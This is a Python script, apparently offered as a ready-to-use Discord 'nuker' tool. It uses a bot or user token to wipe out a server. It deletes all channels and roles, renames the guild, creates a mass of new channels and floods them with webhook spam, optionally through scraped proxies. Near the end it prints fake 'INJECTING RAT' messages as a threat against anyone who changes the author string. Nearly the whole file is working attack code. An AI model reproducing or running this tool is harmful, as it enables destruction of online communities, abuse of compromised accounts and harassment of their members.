from util.proxies import proxy_scrape, proxy
import os
import random
import time
import asyncio
import aiohttp
from pystyle import Colors, Center, Colorate, Write
import sys
import json
import threading
import urllib3
import requests


__author__ = 'WebUwU'



with open('config.json', 'r') as f:
    config = json.load(f)
    TOKEN = config["TOKEN"]
    MESSAGE = config["MESSAGE"]
    AMMOUNT_OF_CHANNELS = config["AMMOUNT_OF_CHANNELS"]
    SPAM_PRN = config["SPAM_PRN"]
    PROXIES = config["PROXIES"]
    MESSAGES_PER_CHANNEL = config["MESSAGES_PER_CHANNEL"]
    CHANNEL_NAME = config["CHANNEL_NAME"]
    WEBHOOK_NAME = config["WEBHOOK_NAME"]
    WEBHOOK_PROFILE_PIC = config["WEBHOOK_PROFILE_PIC"]
    DELETE_ROLES = config["Delete_Roles"]
    SERVER_NAME = config["Server_Name"]
    

banner = Center.XCenter("""
             
  █████████  ███                                   ██████   █████          █████                        
 ███░░░░░███░░░                                   ░░██████ ░░███          ░░███                         
░███    ░░░ ████   ███████ █████████████    ██████ ░███░███ ░███ █████ ████░███ █████  ██████  ████████ 
░░█████████░░███  ███░░███░░███░░███░░███  ░░░░░███░███░░███░███░░███ ░███ ░███░░███  ███░░███░░███░░███
 ░░░░░░░░███░███ ░███ ░███ ░███ ░███ ░███   ███████░███ ░░██████ ░███ ░███ ░██████░  ░███████  ░███ ░░░ 
 ███    ░███░███ ░███ ░███ ░███ ░███ ░███  ███░░███░███  ░░█████ ░███ ░███ ░███░░███ ░███░░░   ░███     
░░█████████ █████░░███████ █████░███ █████░░████████████  ░░█████░░████████████ █████░░██████  █████    
 ░░░░░░░░░ ░░░░░  ░░░░░███░░░░░ ░░░ ░░░░░  ░░░░░░░░░░░░    ░░░░░  ░░░░░░░░░░░░ ░░░░░  ░░░░░░  ░░░░░     
                  ███ ░███                                                                              
                 ░░██████                                                                               
                  ░░░░░░                                                                                
                                                    
                           Made by WebUwU :3 |  join server discord.gg/boobss\n\n
""")
print(Colorate.Vertical(Colors.red_to_purple, banner, 2))

all_choices = f"""
Token = {TOKEN}
Server Name = {SERVER_NAME}
Channel name = {CHANNEL_NAME}
Webhook name = {WEBHOOK_NAME}
Message = {MESSAGE}
Ammount of channels = {AMMOUNT_OF_CHANNELS}
Messages per channel = {MESSAGES_PER_CHANNEL}
Proxies = {PROXIES}
Spam PRN = {SPAM_PRN}
Delete_Roles = {DELETE_ROLES}
"""

lines = all_choices.split("\n")
new_lines = []
for line in lines:
    index_of_equal = line.find("=")
    if index_of_equal == -1:
        continue
    key = line[:index_of_equal].strip()
    value = line[index_of_equal+1:].strip()
    key = Colorate.Color(Colors.purple, key, False)
    value = Colorate.Color(Colors.red, value, False)
    new_lines.append(key + " = " + value)

all_choices = "\n".join(new_lines)
print(all_choices)
print(Colorate.Color(Colors.purple, '', False))



api = "https://discord.com/api/v9"
nwords = None
ADMINISTRATOR_PERMISSION = 0x8
MANAGE_GUILD_PERMISSION = 0x20
bot_or_person = input("Is this a bot token or a person (user) token? (bot/person) ")

if bot_or_person == "bot" or bot_or_person == "bo" or bot_or_person == "b":
    token = TOKEN
    nwords = {"Authorization": f"Bot {token}"}
    
elif bot_or_person == "person" or bot_or_person == "user" or bot_or_person == "u" or  bot_or_person == "p":
    token = TOKEN
    nwords = {"Authorization": f"{token}"}

else:
    Write.Print("Invalid option!", Colors.red)
    sys.exit()

guild = input("What is the guild id of the server you are nuking? -> ")

async def main():       
    async with aiohttp.ClientSession() as schinken:
        async with schinken.get('https://discord.com/api/v9/users/@me', headers=nwords) as r:
            if r.status == 200:
                print(Colorate.Color(Colors.blue, "Token is valid!", True))
                print("Have Fun at Nuking")
            else:
                Write.Print("Token is invalid!",Colors.red, interval=0.00000001)
                sys.exit()

                
        async with schinken.get(f'{api}/guilds/{guild}/channels', headers=nwords) as r:
            channel_id = await r.json()
            async with schinken.get(headers = nwords, url = f'{api}/guilds/{guild}/channels') as f:
                channel_id = await f.json()
                for channel in channel_id:
                    await schinken.delete(f'{api}/channels/{channel["id"]}', headers=nwords)
        for i in range(int(AMMOUNT_OF_CHANNELS)):
            channel = await schinken.post(f'{api}/guilds/{guild}/channels', headers=nwords, json={"name": CHANNEL_NAME, "type": 0})
            data_channel = await channel.json()
            channel_id = data_channel["id"]
            try:
                async with schinken.post(f'{api}/channels/{channel_id}/webhooks', headers=nwords, json={"name": WEBHOOK_NAME}) as r:
                    webhook_raw = await r.json()
                    webhook = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}'
                    threading.Thread(target=spamhook, args=(webhook,)).start()
            except:
                print('U ratelimited af :skull:', Colors.red)

    async with aiohttp.ClientSession() as schinken:
                    try:
                        async with schinken.get(f"{api}/users/@me/guilds/{guild}/member", headers=nwords) as r:
                            data = await r.json()
                        for role_id in data["roles"]:
                            role_permissions = get_role_permissions(role_id)
                        if role_permissions & (ADMINISTRATOR_PERMISSION | MANAGE_GUILD_PERMISSION) == (ADMINISTRATOR_PERMISSION | MANAGE_GUILD_PERMISSION):
                            print("mhh looks like i am lazy")
                        else:
                            print(f"error")
                    except:
                        new_server_name = {"name": f"{SERVER_NAME}"}
                        response = requests.patch(f"https://discord.com/api/v9/guilds/{guild}", headers=nwords, json=new_server_name)
                        if response.status_code == 200:   
                            print(Colorate.Color(Colors.green,  f'Server name changed successfully to "{SERVER_NAME}"!',True))        
headers = nwords
if DELETE_ROLES == True:
        async def DELETE_ROLESS():
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.get(f"https://discord.com/api/guilds/{guild}/roles") as response:
                    if response.status == 200:
                        roles = await response.json()
                        Write.Print(f"Successfully retrieved -{len(roles)}- roles\n", Colors.green , interval=0.00000001)
                        for role in roles:
                            role_idd = role["id"]
                            async with session.delete(f"https://discord.com/api/guilds/{guild}/roles/{role_idd}") as delete_response:
                                if delete_response.status == 204:
                                    Write.Print(f"[+] Successfully deleted role {role['name']}", Colors.red, interval=0.00000001)
                                else:
                                    print(Colorate.Color(Colors.red, f" [!] Failed to delete role {role['name']}.", True))
                    else:
                        Write.Print(f" [!] Failed to retrieve roles.", Colors.red, interval=0.00000001)  
                        
asyncio.run(DELETE_ROLESS())


def spamhookp(hook):
    for i in range(MESSAGES_PER_CHANNEL):
        http = urllib3.PoolManager()
        if SPAM_PRN == True:
            try:
                with open('random.txt') as f:
                    lines = f.readlines()
                    random_int = random.randint(0,len(lines)-1)
                    ran = lines[random_int]
                http.request('POST', hook, fields={'content': f"{MESSAGE} + {ran}", 'avatar_url': f"{WEBHOOK_PROFILE_PIC}"}, proxy_url=proxy())
            except:
                Write.Print(f'error spamming! {hook}', Colors.red)
        else:
            try:
                http.request('POST', hook, fields={'content': MESSAGE, 'avatar_url': WEBHOOK_PROFILE_PIC}, proxy_url=proxy())
            except:
                Write.Print(f'error spamming! {hook}', Colors.red, interval=0.00000001)
                ############
    sys.exit()

        
def spamhook(hook):
    for i in range(MESSAGES_PER_CHANNEL):
        http = urllib3.PoolManager()
        if SPAM_PRN == True:
            try:
                with open('random.txt') as f:
                    lines = f.readlines()
                    random_int = random.randint(0,len(lines)-1)
                    ran = lines[random_int]
                http.request('POST', hook, fields={
                    
                    'content': f"{MESSAGE} + {ran}", 
                    'avatar_url': f"{WEBHOOK_PROFILE_PIC}" })
            except:
                Write.Print(f'error spamming! {hook}', Colors.red, interval=0.00000001)
        else:
            try:
                http.request('POST', hook, fields={'content': MESSAGE, 'avatar_url': WEBHOOK_PROFILE_PIC})
            except:
                Write.Print(f'error spamming! {hook}', Colors.red, interval=0.00000001)
####################################################################################
 

if __author__ != "\x57\x65\x62\x55\x77\x55": # naw
        print(Colors.cyan + 'INJECTING RAT 0/5'),time.sleep(1)
        print(Colors.dark_blue + 'INJECTING RAT 1/5'),time.sleep(1)
        print(Colors.cyan + 'INJECTING RAT 2/5'),time.sleep(1)
        print(Colors.dark_blue + 'INJECTING RAT 3/5'),time.sleep(1)
        print(Colors.cyan + 'INJECTING RAT 4/5'),time.sleep(1)
        print(Colors.dark_blue + 'INJECTING RAT 5/5'),time.sleep(1)
        print(Colors.dark_green + "INJECTING COMPLETE"), print(Colors.white + ""),time.sleep(1)
        time.sleep(5)
        os._exit(0)    


if PROXIES == True:
    proxy_scrape()

if __name__ == '__main__':
        asyncio.run(main())
